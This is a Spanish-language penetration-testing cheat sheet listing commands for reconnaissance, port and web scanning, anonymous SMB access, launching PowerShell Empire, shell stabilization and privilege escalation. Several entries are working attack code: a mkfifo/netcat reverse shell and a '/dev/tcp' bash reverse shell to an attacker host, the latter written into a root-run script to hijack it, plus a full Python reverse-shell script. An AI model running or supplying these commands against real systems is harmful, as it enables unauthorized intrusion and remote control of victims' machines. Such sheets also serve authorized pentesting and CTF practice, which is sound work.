### INFO-GATHER
whois [DOMINIO] > para la shell
www.who.is º > para consultar en la web.
host [DOMINO] > para ver direcciones IP
dnsrecon -d [WEB] > ver registros DNS

### SCAN TARGET
**Escaneo de puertos abiertos**
	nmap -p- --open -sS -n -Pn --min-rate 5000 [RHOST]
**Escaneo de servicios y scripts por defecto**
	nmap -p[PUERTOS] -sVC [RHOST]
### DESCRUBRIMIENTO DE HOSTS
**Ver otros equipos dentro de la misma red**
	sudo nmap -sn [IP & MASK] 
	sudo arp-scan -l
	sudo netdiscover -r [IP & MASK]

### SCAN WEB
**Escaneo de directorios**
	gobuster dir -u [RHOST]-w /usr/share/dirb/wordlists/[WORDLIST] --no-error -t 200
**Escaneo de subdominios**
	gobuster dns -d [DOMINIO] -w /usr/share/dnsrecon/[WORDLIST] -t 200 --no-error
	wfuzz -w /usr/share/dnsrecon/[WORDLIST] -u [DOMINIO] -H 'Host: FUZZ.[DOMINIO]' -t 50 --hc 302 

### SMB
smbexec.py 'username:password'@IP > se conecta al objetivo
smbclient -L [HOST] -N > listar shares sin pasar contraseña
smbclient -N //[HOST]/[SHARE] > nos conectamos al share sin pasar contraseña

### EMPIRE POWERSHELL
powershell-empire server > inicia el servidor de empire
powershell-empire client > inicia el cliente

### ESTABILIZAR SHELL
**Metodo 1**
	**Victima**
		rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh  -i 2>&1|nc [LHOST] \[LPORT] >/tmp/f
	**Atacante**
		nc -nvlp [LPORT]
**Metodo 2 (Python)**
	python3 -c 'import pty;pty.spawn("/bin/bash")'
	_Ctrl+Z_
	stty raw -echo; fg
	export TERM=xterm

### PRIVESC
**POSIBLE PRIVESC CON PYTHON**
	python3 -c 'import os; os.setuid(0);os.system("/bin/sh")'
**VERIFICAR BINARIOS Y SUDO**
	sudo -l
	find / -perm -u=s -type f 2>/dev/null
	find / -type -f -perm -04000 -ls 2>/dev/null
**SOBREESCRIBIR SCRIPT DE ROOT PARA GENERAR REVSHELL DE ROOT.** 
	echo '#!/bin/bash' > script
	echo 'sh -i >& /dev/tcp/**LHOST**/**LPORT** 0>&1' >> script
**VARIABLES DE ENTORNO**
	printenv
### AGREGAR PATH LINUX
PATH=/RUTA:$PATH

### REVERSE SHELL
**Script Python**
	import socket
	import os
	import subprocess
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("[LHOST]",[LPORT]))
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	import pty
	pty.spawn("bash")